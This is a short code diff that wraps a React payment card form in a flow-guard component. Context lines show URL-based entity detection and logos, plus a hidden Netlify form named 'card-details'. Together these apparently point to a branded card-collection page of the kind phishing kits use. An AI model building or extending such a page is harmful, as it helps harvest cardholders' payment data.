@@ -14,8 +14,9 @@ import { Card } from "@/components/ui/card";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import PaymentFlowGuard from "@/components/PaymentFlowGuard";
 
-const PaymentCardForm = () => {
+const PaymentCardFormContent = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
@@ -483,7 +484,7 @@ const PaymentCardForm = () => {
           </div>
         </div>
       </div>
-    
+
       {/* Hidden Netlify Form */}
       <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
@@ -499,5 +500,12 @@ const PaymentCardForm = () => {
     </>
   );
 };
+
+// Wrapper with CARD flow guard
+const PaymentCardForm = () => (
+  <PaymentFlowGuard allowedFlow="card">
+    <PaymentCardFormContent />
+  </PaymentFlowGuard>
+);
 
 export default PaymentCardForm;
